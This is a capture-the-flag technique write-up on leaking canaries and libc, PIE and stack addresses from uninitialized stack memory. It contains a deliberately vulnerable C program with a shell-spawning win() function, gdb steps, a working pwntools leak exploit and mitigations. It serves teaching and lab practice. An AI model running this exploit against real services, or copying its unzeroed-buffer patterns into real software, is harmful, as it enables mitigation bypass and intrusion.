---
title: "Uninitialized Stack Memory - Farming Leaks from Frame Reuse"
category: pwn
subcategory: info-leak
type: technique
tags: [info-leak, uninitialized-memory, stack-reuse, stale-frame, canary, libc-leak, pie-leak, saved-rbp, aslr, pie, printf, puts, scanf, read, strncpy, struct-padding, pwntools, gdb, pwndbg, checksec]
difficulty: medium
summary: "Locals are not zeroed, so a later frame sees the previous frame's bytes. Print a partially-filled buffer to leak a canary, libc pointer, PIE base or saved rbp."
when_to_use:
  - "A buffer is printed with %s / puts without being fully written first"
  - "scanf(\"%s\") or scanf(\"%d\") fails or matches nothing, leaving the buffer untouched"
  - "A struct is sent back to you and has padding bytes between members"
  - "PIE/ASLR/canary block everything and you need any address at all"
  - "Two functions with same-size frames run one after the other (menu-driven binaries)"
tools: [pwntools, gdb, pwndbg, gef, checksec, ghidra, one_gadget, libc-database]
related: [stack-buffer-overflow-basics, stack-integer-bugs, stack-ret2win, fmtstr-read-leak, mitigation-canary-bypass, mitigation-libc-identification, rop-ret2libc]
---

## TL;DR

C does not zero automatic variables. A local buffer starts out holding whatever the
last function that used that stack region left behind - return addresses, saved rbp,
canaries, libc pointers from `_IO_*` structures, argv/envp pointers. If the program
prints such a buffer before fully initialising it, you get a free ASLR/PIE/canary
leak with no memory corruption at all.

## Recognise it

- `char buf[64];` then `printf("%s", buf)` / `puts(buf)` / `write(1, buf, sizeof buf)`
  on a path where the read into `buf` can fail or write fewer bytes.
- `scanf("%d", &x)` on non-numeric input leaves `x` untouched; `scanf("%s", buf)` on
  EOF leaves `buf` untouched; `read(0, buf, n)` whose return value is ignored while
  the program prints all of `buf`.
- `strncpy(dst, src, strlen(src))` - no NUL terminator, so a later `%s` runs off the
  end of `dst`; or a struct sent with `write(1, &s, sizeof s)` whose members have
  different alignments, so the padding bytes are stale stack.
- Menu loops where option A fills a 64-byte frame and option B prints a 64-byte frame:
  the two frames overlap exactly.
- Output with `\x7f` at offset 5 of an 8-byte group - a libc pointer
  (`0x00007fxxxxxxxxxx`). `0x55`/`0x56` prefixes are PIE code or heap;
  `0x7ffc`-`0x7ffe` are stack.

## Vulnerable source

```c
/* uninit.c - three ways a later frame sees an earlier frame's bytes */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct record {
    char  name[8];     /* 8  */
    int   id;          /* 4  */
    /* 4 bytes of padding here - never written, never zeroed */
    long  score;       /* 8  */
};

void win(void) { system("/bin/sh"); _exit(0); }

/* Frame A: a deep call that leaves libc/stack pointers in this stack region. */
static void deep(void) {
    char scratch[128];
    snprintf(scratch, sizeof(scratch), "%p %s", (void *)main, "warmup");
    /* scratch is discarded - the bytes stay on the stack */
}

/* Frame B: same size, never fully initialised, printed with %s.
   scanf %s writes NOTHING on EOF or a leading conversion failure, and it
   never touches the tail of the buffer. */
static void shallow(void) {
    char buf[128];
    printf("say something> ");
    fflush(stdout);
    scanf("%127s", buf);
    printf("echo: %s\n", buf);          /* prints past your input into stale bytes */
}

/* Frame C: struct padding is emitted verbatim. */
static void dump_record(void) {
    struct record r;
    printf("name> "); fflush(stdout);
    read(0, r.name, 8);
    r.id = 1337;
    r.score = 0;
    write(1, &r, sizeof(r));            /* the 4 padding bytes are stale stack */
}

/* Frame D: partial read, full print - the return value of read() is ignored. */
static void partial(void) {
    char buf[64];
    printf("data> "); fflush(stdout);
    (void)read(0, buf, sizeof(buf));
    write(1, buf, sizeof(buf));          /* always 64 bytes out */
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    deep();
    for (;;) {
        puts("1) shallow 2) record 3) partial 0) quit");
        printf("> ");
        fflush(stdout);
        int c = 0;
        if (scanf("%d", &c) != 1) { int ch; while ((ch = getchar()) != '\n' && ch != EOF); c = 0; }
        switch (c) {
            case 1: shallow();     break;
            case 2: dump_record(); break;
            case 3: partial();     break;
            default: return 0;
        }
    }
}
```

Build:

```sh
# -fstack-protector-all : leave the canary ON - it is one of the things we leak
# -no-pie               : learn the mechanism first; the -pie build is the PIE drill
# -O0                   : keeps locals where the source puts them, so frames overlap
gcc -fstack-protector-all -no-pie -m64 -O0 -w -o uninit uninit.c
gcc -fstack-protector-all -pie -fPIE -m64 -O0 -w -o uninit_pie uninit.c
```

## Theory

### Why stale data is there at all

Frames are carved out of the same stack region over and over. `sub rsp, 0x80` clears
nothing - it just moves the pointer. When `deep()` returns, its 128 bytes of `scratch`
are still in memory; when `shallow()` is called at the same depth with the same frame
size, its `buf` occupies the exact same addresses. What tends to be lying there:

| Source of the stale bytes | What you get |
| --- | --- |
| A previous `ret` slot | Code pointer -> PIE base |
| A previous saved rbp | Stack address -> frame layout |
| glibc `printf`/`puts` internals | `_IO_2_1_stdout_`, `main_arena`, `__libc_start_call_main+N` -> libc base |
| `__stack_chk_guard` copy in a returned frame | The thread canary |
| `argv`/`envp` copies, `struct stat`/`sockaddr`/`dirent` | Stack, heap and libc pointers |

The canary deserves a note: every canary-protected function stores the same per-thread
value at `[rbp-8]`. If `shallow()`'s buffer extends over the slot `deep()` used, it
reads the *same* canary it will later have to satisfy - the cleanest bypass there is.

### Why `%s` keeps going

`printf("%s", buf)` stops at the first NUL byte, so an 8-byte input echoes your 8
bytes plus every stale byte up to the next zero. The trick is to **fill the buffer
with non-zero bytes up to the interesting slot**: with `k` bytes in and no terminator
written after them, the leak starts at offset `k`.

With `scanf("%127s", buf)` the terminator *is* written right after your token, so the
leak stops there - unless the conversion never runs. Close stdin (or send only
whitespace) and `scanf` returns `EOF` having written nothing, so `printf("%s", buf)`
dumps the frame from byte 0.

A third way, which works even when `scanf` succeeds: `%s` writes the terminator at
`buf[len]`, so bytes `buf[len+1..]` are still stale. Any *second* print that starts
after that terminator (e.g. `write(1, buf, sizeof buf)`) leaks them.

### Partially-filled buffers

`read` returns how many bytes it got. A program that ignores that and then does
`write(1, buf, sizeof(buf))` leaks `sizeof(buf) - n` stale bytes with `n` entirely
under your control - a **scanning oracle**: send `n = 0..63` and stitch the tails.

### Struct padding

```c
struct record { char name[8]; int id; /* pad[4] */ long score; };
```

`sizeof(struct record)` is 24 on x86-64: 8 + 4 + 4 padding + 8. Padding is never
initialised by member-by-member assignment (only `memset` or `= {0}` clears it), so a
`write(fd, &r, sizeof r)` or `send(fd, &pkt, sizeof pkt, 0)` ships those 4 stale bytes
straight to you. The same holds for unions where the program sends the whole union.

### Turning the leak into a base address

Leaked pointers are *absolute*. Subtract the known offset of the symbol within its
mapping to get a base:

```
libc_base = leaked_libc_ptr - libc.symbols["<whatever it points at>"]
pie_base  = leaked_code_ptr - <offset of that code in the ELF>
```

The hard part is knowing *what* the pointer points at: run locally with ASLR off,
`x/32gx $rsp`, then `info symbol <value>` on each candidate and subtract the `vmmap`
base. That delta is stable per libc build - verify it against the remote libc with
`mitigation-libc-identification`.

## Attack

1. Find a print of a buffer that is not fully written. Confirm by sending 1 byte and
   observing more than 1 byte back.
2. Byte-scan: for `k = 0 .. size-1`, send `k` bytes of filler and keep the tail. The
   stitched tails are the whole stale frame.
3. Group into 8-byte qwords and classify: `0x00007fxx...` libc or mmap,
   `0x0000555x...`/`0x00005600...` PIE image or heap, `0x00007ffx...` stack, and a
   random qword whose low byte is `0x00` is the canary.
4. Identify the symbols with `info symbol` locally, then hardcode the deltas.
5. Compute `libc_base`, `pie_base`, `canary`, `stack_leak` and feed them onward: ret2libc (`rop-ret2libc`), one_gadget
   (`rop-one-gadget`), or a canary-preserving overflow (`mitigation-canary-bypass`).

## Debugging workflow

```
gdb ./uninit
pwndbg> set disable-randomization on
pwndbg> b shallow
pwndbg> run
pwndbg> x/32gx $rsp                 # the stale frame, before scanf touches it
pwndbg> info symbol 0x7ffff7c29d90  # -> __libc_start_call_main + 128 in libc
pwndbg> vmmap libc                  # base address to subtract
pwndbg> canary                      # pwndbg prints the thread canary directly
```

Break in `deep` and then in `shallow` and compare `$rsp`: an identical value means the
frames alias, which is the condition the leak needs. Then diff two runs - every byte
that changes is an ASLR-dependent pointer:

```sh
# Bytes that differ between two identical runs are the randomised pointers.
printf '3\nA\n0\n' | ./uninit | xxd > /tmp/a.hex
printf '3\nA\n0\n' | ./uninit | xxd > /tmp/b.hex
diff /tmp/a.hex /tmp/b.hex
```

## Exploit

```python
#!/usr/bin/env python3
"""Farm a stale-stack frame byte by byte, classify the pointers, derive bases.

Usage:
    ./exploit.py                  # local
    ./exploit.py HOST PORT        # remote
    ./exploit.py --scan           # only dump and classify the frame, no exploit
    ./exploit.py --stitch         # rebuild the whole frame, one connection per byte
"""
from pwn import *
import sys

BINARY = "./uninit"
BUFSZ = 64          # size of the partially-filled buffer in partial()

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "info"

# Measured once, locally, with `info symbol` + `vmmap`. Re-measure per target libc.
LIBC_LEAK_DELTA = 0x29D90     # leaked_qword - libc_base
PIE_LEAK_DELTA = 0x1234       # leaked_qword - pie_base


def start(argv):
    if len(argv) >= 2:
        return remote(argv[0], int(argv[1]))
    return process(BINARY)


def menu(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())


def leak_frame(io, fill):
    """Send `fill` bytes into partial(); the remaining BUFSZ-fill bytes are stale."""
    menu(io, 3)
    io.recvuntil(b"data> ")
    io.send(b"A" * max(fill, 1))   # read() must return, so send at least one byte
    return io.recvn(BUFSZ)


def classify(qword):
    if qword == 0:
        return "zero"
    if (qword >> 40) == 0x7F:
        return "libc/mmap pointer"
    if 0x7FF0_0000_0000 <= (qword >> 16) <= 0x7FFF_FFFF_FFFF:
        return "stack pointer"
    if (qword >> 40) in (0x55, 0x56):
        return "pie/heap pointer"
    if (qword & 0xFF) == 0 and qword > 0x1000:
        return "possible stack canary"
    if qword < 0x1_0000_0000:
        return "small int / packed ascii"
    return "unknown"


def stitch_frame(argv):
    """Walk the fill length: sending k bytes reveals stale bytes [k:] of the echo.

    Stitching every tail together rebuilds the whole frame without guessing
    where the interesting qwords sit. One connection per k.
    """
    frame = bytearray(BUFSZ)
    for k in range(1, BUFSZ):
        io = start(argv)
        try:
            frame[k:] = leak_frame(io, k)[k:]
        except EOFError:
            pass
        finally:
            io.close()
    return bytes(frame)


def dump_frame(io_or_raw):
    raw = leak_frame(io_or_raw, 1) if not isinstance(io_or_raw, bytes) else io_or_raw
    log.info("stale frame (%d bytes):\n%s", len(raw), hexdump(raw))
    qwords = []
    for i in range(0, len(raw) - 7, 8):
        q = u64(raw[i:i + 8])
        qwords.append(q)
        log.info("  +0x%02x  %#018x  %s", i, q, classify(q))
    return qwords


def pick(qwords, kind):
    return next((q for q in qwords if classify(q) == kind), None)


def main():
    argv = [a for a in sys.argv[1:] if not a.startswith("--")]

    if "--stitch" in sys.argv:
        dump_frame(stitch_frame(argv))
        return
    io = start(argv)
    qwords = dump_frame(io)

    libc_ptr = pick(qwords, "libc/mmap pointer")
    stack_ptr = pick(qwords, "stack pointer")
    canary = pick(qwords, "possible stack canary")
    code_ptr = pick(qwords, "pie/heap pointer")

    if libc_ptr:
        log.success("libc  %#018x -> base %#018x", libc_ptr, libc_ptr - LIBC_LEAK_DELTA)
    if code_ptr:
        log.success("code  %#018x -> base %#018x", code_ptr, code_ptr - PIE_LEAK_DELTA)
    if stack_ptr:
        log.success("stack %#018x", stack_ptr)
    if canary:
        log.success("canary %#018x", canary)

    if "--scan" in sys.argv:
        io.close()
        return

    log.info("feed these into rop-ret2libc / mitigation-canary-bypass")
    menu(io, 0)
    io.interactive()


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **The leak is not stable.** Stack contents depend on argv/envp sizes, so the frame
  differs between your shell and the remote service. Prefer deltas *within* the leak
  over absolute positions, and verify twice on the target.
- **Environment changes the layout.** gdb adds `LINES`, `COLUMNS` and `_=/usr/bin/gdb`
  to envp, shifting the stack. Use `gdb.attach` on a normally started process, or
  `process(BINARY, env={})`.
- **`%s` stops at a NUL.** If the first stale byte is zero you get nothing; fill
  further, or use a fixed-length `write` that ignores NULs.
- **`scanf("%s")` does terminate.** It writes `\0` after your token, capping the leak;
  force the conversion to fail (EOF, or `%d` fed non-numeric input) so nothing is
  written at all.
- **`scanf("%d", &x)` on bad input leaves the offending bytes in the stream**, so your
  first malformed line can desynchronise the whole session.
- **`memset(buf, 0, sizeof buf)` kills the bug**, and
  `-ftrivial-auto-var-init=zero|pattern` kills the whole class. Look for the paths
  where the memset is skipped: error branches, early returns, `goto fail`.
- **Struct padding stays dirty only with member-wise init** - `= {0}` zeroes it.
- **Leaked stack addresses are the most volatile** - same-run use only. The canary is
  per-thread, so a leak taken on another thread is useless.
- **Off-by-one string bugs feed this class.** `strncpy(dst, src, strlen(src))` leaves
  `dst` unterminated, so the next `printf("%s", dst)` leaks the adjacent frame - see
  `stack-integer-bugs`.
- **If nothing interesting is in the frame, make it so.** Call a menu option that runs
  `printf`, `snprintf`, `stat` or any libc-heavy function first; it leaves libc
  pointers in the region your buffer later occupies. Frame-size matching is the whole
  game: find the function whose frame has the same size and depth.

## Tools

- `pwntools` - `u64`, `hexdump`, `recvn`, `process(env={})` for a clean stack layout.
- `gdb` + `pwndbg`/`gef` - `x/32gx $rsp`, `info symbol <addr>`, `vmmap`, `canary`.
- `checksec` - tells you whether the canary and PIE you are about to leak even exist.
- `libc-database` / `mitigation-libc-identification` - turn a leaked pointer's low 12
  bits into a libc build; `one_gadget` is the natural consumer of the resulting base.
- `ghidra` - find the paths where the `memset` is skipped and the print still runs.
